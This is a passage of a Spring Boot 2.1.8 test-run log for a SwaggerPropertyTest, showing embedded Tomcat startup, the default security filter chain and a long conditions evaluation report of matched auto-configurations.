org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration, class org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration, class org.springframework.boot.actuate.autoconfigure.metrics.web.servlet.WebMvcMetricsAutoConfiguration, class org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration, class org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration, class org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration, class org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration], excludeName=[])]], org.springframework.boot.test.context.filter.ExcludeFilterContextCustomizer@2ea6137, org.springframework.boot.test.json.DuplicateJsonObjectContextCustomizerFactory$DuplicateJsonObjectContextCustomizer@57d5872c, org.springframework.boot.test.mock.mockito.MockitoContextCustomizer@0, org.springframework.boot.test.web.client.TestRestTemplateContextCustomizer@341b80b2, org.springframework.boot.test.autoconfigure.properties.PropertyMappingContextCustomizer@0, org.springframework.boot.test.autoconfigure.web.servlet.WebDriverContextCustomizerFactory$Customizer@5ef60048], resourceBasePath = 'src/main/webapp', contextLoader = 'org.springframework.boot.test.context.SpringBootContextLoader', parent = [null]], attributes = map['org.springframework.test.context.web.ServletTestExecutionListener.activateListener' -> false]]].
05:31:33.703 [main] DEBUG org.springframework.test.context.support.TestPropertySourceUtils - Adding inlined properties to environment: {spring.jmx.enabled=false, org.springframework.boot.test.context.SpringBootTestContextBootstrapper=true, server.port=0}

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.8.RELEASE)

2019-10-14 05:31:34.533  INFO 8124 --- [           main] c.p.m.c.s.property.SwaggerPropertyTest   : Starting SwaggerPropertyTest on PC with PID 8124 (started by Alex in C:\Users\Alex\Documents\pem-message\common2\.build\bin\paragon.mailingcontour.commons.common\test-classes)
2019-10-14 05:31:34.534  INFO 8124 --- [           main] c.p.m.c.s.property.SwaggerPropertyTest   : The following profiles are active: test
2019-10-14 05:31:41.860  INFO 8124 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 0 (http)
2019-10-14 05:31:41.910  INFO 8124 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2019-10-14 05:31:41.910  INFO 8124 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.24]
2019-10-14 05:31:42.432  INFO 8124 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
2019-10-14 05:31:42.432  INFO 8124 --- [           main] o.s.web.context.ContextLoader            : Root WebApplicationContext: initialization completed in 7868 ms
2019-10-14 05:31:46.386  INFO 8124 --- [           main] o.s.s.web.DefaultSecurityFilterChain     : Creating filter chain: any request, [org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@3002e397, org.springframework.security.web.context.SecurityContextPersistenceFilter@216372b7, org.springframework.security.web.header.HeaderWriterFilter@6222391a, org.springframework.security.web.csrf.CsrfFilter@50ec4bfc, org.springframework.security.web.authentication.logout.LogoutFilter@252ec02e, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@476fde05, org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter@2dbfa972, org.springframework.security.web.authentication.ui.DefaultLogoutPageGeneratingFilter@7da1e005, org.springframework.security.web.authentication.www.BasicAuthenticationFilter@12192604, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@12abcd1e, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@51e7589f, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@38159384, org.springframework.security.web.session.SessionManagementFilter@d2708a7, org.springframework.security.web.access.ExceptionTranslationFilter@2dc39b53, org.springframework.security.web.access.intercept.FilterSecurityInterceptor@7b9088f2]
2019-10-14 05:31:46.635  INFO 8124 --- [           main] o.s.b.a.e.web.EndpointLinksResolver      : Exposing 2 endpoint(s) beneath base path '/actuator'
2019-10-14 05:31:46.922  INFO 8124 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 39296 (http) with context path ''
2019-10-14 05:31:46.927  INFO 8124 --- [           main] c.p.m.c.s.property.SwaggerPropertyTest   : Started SwaggerPropertyTest in 13.22 seconds (JVM running for 17.212)



============================
CONDITIONS EVALUATION REPORT
============================


Positive matches:
-----------------

   AopAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'org.springframework.context.annotation.EnableAspectJAutoProxy', 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice', 'org.aspectj.weaver.AnnotatedElement' (OnClassCondition)
      - @ConditionalOnProperty (spring.aop.auto=true) matched (OnPropertyCondition)

   AopAutoConfiguration.CglibAutoProxyConfiguration matched:
      - @ConditionalOnProperty (spring.aop.proxy-target-class=true) matched (OnPropertyCondition)

   AuditAutoConfiguration#auditListener matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.audit.listener.AbstractAuditListener; SearchStrategy: all) did not find any beans (OnBeanCondition)

   AuditAutoConfiguration#authenticationAuditListener matched:
      - @ConditionalOnClass found required class 'org.springframework.security.authentication.event.AbstractAuthenticationEvent' (OnClassCondition)
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.security.AbstractAuthenticationAuditListener; SearchStrategy: all) did not find any beans (OnBeanCondition)

   AuditAutoConfiguration#authorizationAuditListener matched:
      - @ConditionalOnClass found required class 'org.springframework.security.access.event.AbstractAuthorizationEvent' (OnClassCondition)
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.security.AbstractAuthorizationAuditListener; SearchStrategy: all) did not find any beans (OnBeanCondition)

   AuditAutoConfiguration.AuditEventRepositoryConfiguration matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.audit.AuditEventRepository; SearchStrategy: all) did not find any beans (OnBeanCondition)

   AuditEventsEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.auditevents.enabled found so using endpoint default (OnEnabledEndpointCondition)

   AuditEventsEndpointAutoConfiguration#auditEventsEndpoint matched:
      - @ConditionalOnBean (types: org.springframework.boot.actuate.audit.AuditEventRepository; SearchStrategy: all) found bean 'auditEventRepository'; @ConditionalOnMissingBean (types: org.springframework.boot.actuate.audit.AuditEventsEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   BeansEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.beans.enabled found so using endpoint default (OnEnabledEndpointCondition)

   BeansEndpointAutoConfiguration#beansEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.beans.BeansEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   CacheMeterBinderProvidersConfiguration matched:
      - @ConditionalOnClass found required class 'io.micrometer.core.instrument.binder.MeterBinder' (OnClassCondition)

   CacheMeterBinderProvidersConfiguration.CaffeineCacheMeterBinderProviderConfiguration matched:
      - @ConditionalOnClass found required classes 'org.springframework.cache.caffeine.CaffeineCache', 'com.github.benmanes.caffeine.cache.Cache' (OnClassCondition)

   CachesEndpointAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.cache.CacheManager' (OnClassCondition)
      - @ConditionalOnEnabledEndpoint no property management.endpoint.caches.enabled found so using endpoint default (OnEnabledEndpointCondition)

   CachesEndpointAutoConfiguration#cachesEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.cache.CachesEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   CachesEndpointAutoConfiguration#cachesEndpointWebExtension matched:
      - @ConditionalOnBean (types: org.springframework.boot.actuate.cache.CachesEndpoint; SearchStrategy: all) found bean 'cachesEndpoint'; @ConditionalOnMissingBean (types: org.springframework.boot.actuate.cache.CachesEndpointWebExtension; SearchStrategy: all) did not find any beans (OnBeanCondition)

   CaffeineCacheConfiguration matched:
      - @ConditionalOnClass found required classes 'com.github.benmanes.caffeine.cache.Caffeine', 'org.springframework.cache.caffeine.CaffeineCacheManager' (OnClassCondition)
      - Cache org.springframework.boot.autoconfigure.cache.CaffeineCacheConfiguration automatic cache type (CacheCondition)

   CodecsAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.http.codec.CodecConfigurer' (OnClassCondition)

   CodecsAutoConfiguration.JacksonCodecConfiguration matched:
      - @ConditionalOnClass found required class 'com.fasterxml.jackson.databind.ObjectMapper' (OnClassCondition)

   CodecsAutoConfiguration.JacksonCodecConfiguration#jacksonCodecCustomizer matched:
      - @ConditionalOnBean (types: com.fasterxml.jackson.databind.ObjectMapper; SearchStrategy: all) found bean 'jacksonObjectMapper' (OnBeanCondition)

   CompositeMeterRegistryAutoConfiguration matched:
      - @ConditionalOnClass found required class 'io.micrometer.core.instrument.composite.CompositeMeterRegistry' (OnClassCondition)

   ConditionsReportEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.conditions.enabled found so using endpoint default (OnEnabledEndpointCondition)

   ConditionsReportEndpointAutoConfiguration#conditionsReportEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.autoconfigure.condition.ConditionsReportEndpoint; SearchStrategy: current) did not find any beans (OnBeanCondition)

   ConfigurationPropertiesReportEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.configprops.enabled found so using endpoint default (OnEnabledEndpointCondition)

   ConfigurationPropertiesReportEndpointAutoConfiguration#configurationPropertiesReportEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.context.properties.ConfigurationPropertiesReportEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   DiskSpaceHealthIndicatorAutoConfiguration matched:
      - @ConditionalOnEnabledHealthIndicator management.health.defaults.enabled is considered true (OnEnabledHealthIndicatorCondition)

   DiskSpaceHealthIndicatorAutoConfiguration#diskSpaceHealthIndicator matched:
      - @ConditionalOnMissingBean (names: diskSpaceHealthIndicator; SearchStrategy: all) did not find any beans (OnBeanCondition)

   DispatcherServletAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   DispatcherServletAutoConfiguration.DispatcherServletConfiguration matched:
      - @ConditionalOnClass found required class 'javax.servlet.ServletRegistration' (OnClassCondition)
      - Default DispatcherServlet did not find dispatcher servlet beans (DispatcherServletAutoConfiguration.DefaultDispatcherServletCondition)

   DispatcherServletAutoConfiguration.DispatcherServletRegistrationConfiguration matched:
      - @ConditionalOnClass found required class 'javax.servlet.ServletRegistration' (OnClassCondition)
      - DispatcherServlet Registration did not find servlet registration bean (DispatcherServletAutoConfiguration.DispatcherServletRegistrationCondition)

   DispatcherServletAutoConfiguration.DispatcherServletRegistrationConfiguration#dispatcherServletRegistration matched:
      - @ConditionalOnBean (names: dispatcherServlet; types: org.springframework.web.servlet.DispatcherServlet; SearchStrategy: all) found bean 'dispatcherServlet' (OnBeanCondition)

   EmbeddedWebServerFactoryCustomizerAutoConfiguration matched:
      - @ConditionalOnWebApplication (required) found 'session' scope (OnWebApplicationCondition)

   EmbeddedWebServerFactoryCustomizerAutoConfiguration.TomcatWebServerFactoryCustomizerConfiguration matched:
      - @ConditionalOnClass found required classes 'org.apache.catalina.startup.Tomcat', 'org.apache.coyote.UpgradeProtocol' (OnClassCondition)

   EndpointAutoConfiguration#endpointCachingOperationInvokerAdvisor matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.invoker.cache.CachingOperationInvokerAdvisor; SearchStrategy: all) did not find any beans (OnBeanCondition)

   EndpointAutoConfiguration#endpointOperationParameterMapper matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.invoke.ParameterValueMapper; SearchStrategy: all) did not find any beans (OnBeanCondition)

   EnvironmentEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.env.enabled found so using endpoint default (OnEnabledEndpointCondition)

   EnvironmentEndpointAutoConfiguration#environmentEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.env.EnvironmentEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   EnvironmentEndpointAutoConfiguration#environmentEndpointWebExtension matched:
      - @ConditionalOnBean (types: org.springframework.boot.actuate.env.EnvironmentEndpoint; SearchStrategy: all) found bean 'environmentEndpoint'; @ConditionalOnMissingBean (types: org.springframework.boot.actuate.env.EnvironmentEndpointWebExtension; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ErrorMvcAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'javax.servlet.Servlet', 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   ErrorMvcAutoConfiguration#basicErrorController matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.web.servlet.error.ErrorController; SearchStrategy: current) did not find any beans (OnBeanCondition)

   ErrorMvcAutoConfiguration#errorAttributes matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.web.servlet.error.ErrorAttributes; SearchStrategy: current) did not find any beans (OnBeanCondition)

   ErrorMvcAutoConfiguration.DefaultErrorViewResolverConfiguration#conventionErrorViewResolver matched:
      - @ConditionalOnBean (types: org.springframework.web.servlet.DispatcherServlet; SearchStrategy: all) found bean 'dispatcherServlet'; @ConditionalOnMissingBean (types: org.springframework.boot.autoconfigure.web.servlet.error.DefaultErrorViewResolver; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ErrorMvcAutoConfiguration.WhitelabelErrorViewConfiguration matched:
      - @ConditionalOnProperty (server.error.whitelabel.enabled) matched (OnPropertyCondition)
      - ErrorTemplate Missing did not find error template view (ErrorMvcAutoConfiguration.ErrorTemplateMissingCondition)

   ErrorMvcAutoConfiguration.WhitelabelErrorViewConfiguration#beanNameViewResolver matched:
      - @ConditionalOnMissingBean (types: org.springframework.web.servlet.view.BeanNameViewResolver; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ErrorMvcAutoConfiguration.WhitelabelErrorViewConfiguration#defaultErrorView matched:
      - @ConditionalOnMissingBean (names: error; SearchStrategy: all) did not find any beans (OnBeanCondition)

   FlywayEndpointAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.flywaydb.core.Flyway' (OnClassCondition)
      - @ConditionalOnEnabledEndpoint no property management.endpoint.flyway.enabled found so using endpoint default (OnEnabledEndpointCondition)

   GenericCacheConfiguration matched:
      - Cache org.springframework.boot.autoconfigure.cache.GenericCacheConfiguration automatic cache type (CacheCondition)

   HealthEndpointConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.health.enabled found so using endpoint default (OnEnabledEndpointCondition)
      - @ConditionalOnSingleCandidate (types: org.springframework.boot.actuate.health.HealthIndicatorRegistry; SearchStrategy: all) found a primary bean from beans 'healthIndicatorRegistry' (OnBeanCondition)

   HealthEndpointConfiguration#healthEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HealthEndpointWebExtensionConfiguration#createHealthStatusHttpMapper matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthStatusHttpMapper; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HealthEndpointWebExtensionConfiguration#healthWebEndpointResponseMapper matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthWebEndpointResponseMapper; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HealthEndpointWebExtensionConfiguration.ServletWebHealthConfiguration matched:
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnEnabledEndpoint no property management.endpoint.health.enabled found so using endpoint default (OnEnabledEndpointCondition)

   HealthEndpointWebExtensionConfiguration.ServletWebHealthConfiguration#healthEndpointWebExtension matched:
      - @ConditionalOnBean (types: org.springframework.boot.actuate.health.HealthEndpoint; SearchStrategy: all) found bean 'healthEndpoint'; @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthEndpointWebExtension; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HealthIndicatorAutoConfiguration#healthAggregator matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthAggregator; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HealthIndicatorAutoConfiguration#healthIndicatorRegistry matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthIndicatorRegistry; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HealthIndicatorAutoConfiguration.ReactiveHealthIndicatorConfiguration matched:
      - @ConditionalOnClass found required class 'reactor.core.publisher.Flux' (OnClassCondition)

   HealthIndicatorAutoConfiguration.ReactiveHealthIndicatorConfiguration#reactiveHealthIndicatorRegistry matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.ReactiveHealthIndicatorRegistry; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HeapDumpWebEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.heapdump.enabled found so using endpoint default (OnEnabledEndpointCondition)

   HeapDumpWebEndpointAutoConfiguration#heapDumpWebEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.management.HeapDumpWebEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpEncodingAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.filter.CharacterEncodingFilter' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnProperty (spring.http.encoding.enabled) matched (OnPropertyCondition)

   HttpEncodingAutoConfiguration#characterEncodingFilter matched:
      - @ConditionalOnMissingBean (types: org.springframework.web.filter.CharacterEncodingFilter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpMessageConvertersAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.http.converter.HttpMessageConverter' (OnClassCondition)

   HttpMessageConvertersAutoConfiguration#messageConverters matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.autoconfigure.http.HttpMessageConverters; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpMessageConvertersAutoConfiguration.StringHttpMessageConverterConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.http.converter.StringHttpMessageConverter' (OnClassCondition)

   HttpMessageConvertersAutoConfiguration.StringHttpMessageConverterConfiguration#stringHttpMessageConverter matched:
      - @ConditionalOnMissingBean (types: org.springframework.http.converter.StringHttpMessageConverter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpTraceAutoConfiguration matched:
      - @ConditionalOnWebApplication (required) found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnProperty (management.trace.http.enabled) matched (OnPropertyCondition)

   HttpTraceAutoConfiguration#httpExchangeTracer matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.trace.http.HttpExchangeTracer; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpTraceAutoConfiguration#traceRepository matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.trace.http.HttpTraceRepository; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpTraceAutoConfiguration.ServletTraceFilterConfiguration matched:
      - found 'session' scope (OnWebApplicationCondition)

   HttpTraceAutoConfiguration.ServletTraceFilterConfiguration#httpTraceFilter matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   HttpTraceEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.httptrace.enabled found so using endpoint default (OnEnabledEndpointCondition)

   HttpTraceEndpointAutoConfiguration#httpTraceEndpoint matched:
      - @ConditionalOnBean (types: org.springframework.boot.actuate.trace.http.HttpTraceRepository; SearchStrategy: all) found bean 'traceRepository'; @ConditionalOnMissingBean (types: org.springframework.boot.actuate.trace.http.HttpTraceEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   InfoContributorAutoConfiguration#envInfoContributor matched:
      - @ConditionalOnEnabledInfoContributor management.info.defaults.enabled is considered true (OnEnabledInfoContributorCondition)

   InfoEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.info.enabled found so using endpoint default (OnEnabledEndpointCondition)

   InfoEndpointAutoConfiguration#infoEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.info.InfoEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JacksonAutoConfiguration matched:
      - @ConditionalOnClass found required class 'com.fasterxml.jackson.databind.ObjectMapper' (OnClassCondition)

   JacksonAutoConfiguration.Jackson2ObjectMapperBuilderCustomizerConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.http.converter.json.Jackson2ObjectMapperBuilder' (OnClassCondition)

   JacksonAutoConfiguration.JacksonObjectMapperBuilderConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.http.converter.json.Jackson2ObjectMapperBuilder' (OnClassCondition)

   JacksonAutoConfiguration.JacksonObjectMapperBuilderConfiguration#jacksonObjectMapperBuilder matched:
      - @ConditionalOnMissingBean (types: org.springframework.http.converter.json.Jackson2ObjectMapperBuilder; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JacksonAutoConfiguration.JacksonObjectMapperConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.http.converter.json.Jackson2ObjectMapperBuilder' (OnClassCondition)

   JacksonAutoConfiguration.JacksonObjectMapperConfiguration#jacksonObjectMapper matched:
      - @ConditionalOnMissingBean (types: com.fasterxml.jackson.databind.ObjectMapper; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JacksonAutoConfiguration.ParameterNamesModuleConfiguration matched:
      - @ConditionalOnClass found required class 'com.fasterxml.jackson.module.paramnames.ParameterNamesModule' (OnClassCondition)

   JacksonAutoConfiguration.ParameterNamesModuleConfiguration#parameterNamesModule matched:
      - @ConditionalOnMissingBean (types: com.fasterxml.jackson.module.paramnames.ParameterNamesModule; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JacksonHttpMessageConvertersConfiguration.MappingJackson2HttpMessageConverterConfiguration matched:
      - @ConditionalOnClass found required class 'com.fasterxml.jackson.databind.ObjectMapper' (OnClassCondition)
      - @ConditionalOnProperty (spring.http.converters.preferred-json-mapper=jackson) matched (OnPropertyCondition)
      - @ConditionalOnBean (types: com.fasterxml.jackson.databind.ObjectMapper; SearchStrategy: all) found bean 'jacksonObjectMapper' (OnBeanCondition)

   JacksonHttpMessageConvertersConfiguration.MappingJackson2HttpMessageConverterConfiguration#mappingJackson2HttpMessageConverter matched:
      - @ConditionalOnMissingBean (types: org.springframework.http.converter.json.MappingJackson2HttpMessageConverter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JmxEndpointAutoConfiguration#jmxAnnotationEndpointDiscoverer matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.jmx.JmxEndpointsSupplier; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JtaAutoConfiguration matched:
      - @ConditionalOnClass found required class 'javax.transaction.Transaction' (OnClassCondition)
      - @ConditionalOnProperty (spring.jta.enabled) matched (OnPropertyCondition)

   LogFileWebEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.logfile.enabled found so using endpoint default (OnEnabledEndpointCondition)

   LoggersEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.loggers.enabled found so using endpoint default (OnEnabledEndpointCondition)

   LoggersEndpointAutoConfiguration#loggersEndpoint matched:
      - Logging System enabled (LoggersEndpointAutoConfiguration.OnEnabledLoggingSystemCondition)
      - @ConditionalOnBean (types: org.springframework.boot.logging.LoggingSystem; SearchStrategy: all) found bean 'springBootLoggingSystem'; @ConditionalOnMissingBean (types: org.springframework.boot.actuate.logging.LoggersEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ManagementContextAutoConfiguration.SameManagementContextConfiguration matched:
      - Management Port actual port type (SAME) matched required type (OnManagementPortCondition)

   ManagementWebSecurityAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnMissingBean (types: org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   MappingsEndpointAutoConfiguration#mappingsEndpoint matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.mappings.enabled found so using endpoint default (OnEnabledEndpointCondition)

   MappingsEndpointAutoConfiguration.ServletWebConfiguration matched:
      - found 'session' scope (OnWebApplicationCondition)

   MappingsEndpointAutoConfiguration.ServletWebConfiguration.SpringMvcConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
      - @ConditionalOnBean (types: org.springframework.web.servlet.DispatcherServlet; SearchStrategy: all) found bean 'dispatcherServlet' (OnBeanCondition)

   MetricsEndpointAutoConfiguration matched:
      - @ConditionalOnClass found required class 'io.micrometer.core.annotation.Timed' (OnClassCondition)
      - @ConditionalOnEnabledEndpoint no property management.endpoint.metrics.enabled found so using endpoint default (OnEnabledEndpointCondition)

   MultipartAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'javax.servlet.Servlet', 'org.springframework.web.multipart.support.StandardServletMultipartResolver', 'javax.servlet.MultipartConfigElement' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnProperty (spring.servlet.multipart.enabled) matched (OnPropertyCondition)

   MultipartAutoConfiguration#multipartConfigElement matched:
      - @ConditionalOnMissingBean (types: javax.servlet.MultipartConfigElement,org.springframework.web.multipart.commons.CommonsMultipartResolver; SearchStrategy: all) did not find any beans (OnBeanCondition)

   MultipartAutoConfiguration#multipartResolver matched:
      - @ConditionalOnMissingBean (types: org.springframework.web.multipart.MultipartResolver; SearchStrategy: all) did not find any beans (OnBeanCondition)

   NoOpCacheConfiguration matched:
      - Cache org.springframework.boot.autoconfigure.cache.NoOpCacheConfiguration automatic cache type (CacheCondition)

   PersistenceExceptionTranslationAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor' (OnClassCondition)

   PersistenceExceptionTranslationAutoConfiguration#persistenceExceptionTranslationPostProcessor matched:
      - @ConditionalOnProperty (spring.dao.exceptiontranslation.enabled) matched (OnPropertyCondition)
      - @ConditionalOnMissingBean (types: org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor; SearchStrategy: all) did not find any beans (OnBeanCondition)

   PropertyPlaceholderAutoConfiguration#propertySourcesPlaceholderConfigurer matched:
      - @ConditionalOnMissingBean (types: org.springframework.context.support.PropertySourcesPlaceholderConfigurer; SearchStrategy: current) did not find any beans (OnBeanCondition)

   ReactorCoreAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'reactor.core.publisher.Mono', 'reactor.core.publisher.Flux' (OnClassCondition)

   RedisCacheConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.data.redis.connection.RedisConnectionFactory' (OnClassCondition)
      - Cache org.springframework.boot.autoconfigure.cache.RedisCacheConfiguration automatic cache type (CacheCondition)

   RedisReactiveAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'org.springframework.data.redis.connection.ReactiveRedisConnectionFactory', 'org.springframework.data.redis.core.ReactiveRedisTemplate', 'reactor.core.publisher.Flux' (OnClassCondition)

   RestTemplateMetricsConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.client.RestTemplate' (OnClassCondition)

   ScheduledTasksEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.scheduledtasks.enabled found so using endpoint default (OnEnabledEndpointCondition)

   ScheduledTasksEndpointAutoConfiguration#scheduledTasksEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.scheduling.ScheduledTasksEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   SecurityAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.security.authentication.DefaultAuthenticationEventPublisher' (OnClassCondition)

   SecurityAutoConfiguration#authenticationEventPublisher matched:
      - @ConditionalOnMissingBean (types: org.springframework.security.authentication.AuthenticationEventPublisher; SearchStrategy: all) did not find any beans (OnBeanCondition)

   SecurityFilterAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'org.springframework.security.web.context.AbstractSecurityWebApplicationInitializer', 'org.springframework.security.config.http.SessionCreationPolicy' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   SecurityFilterAutoConfiguration#securityFilterChainRegistration matched:
      - @ConditionalOnBean (names: springSecurityFilterChain; SearchStrategy: all) found bean 'springSecurityFilterChain' (OnBeanCondition)

   SecurityRequestMatchersManagementContextConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.security.web.util.matcher.RequestMatcher' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   SecurityRequestMatchersManagementContextConfiguration.MvcRequestMatcherConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
      - @ConditionalOnBean (types: org.springframework.boot.autoconfigure.web.servlet.DispatcherServletPath; SearchStrategy: all) found bean 'dispatcherServletRegistration' (OnBeanCondition)

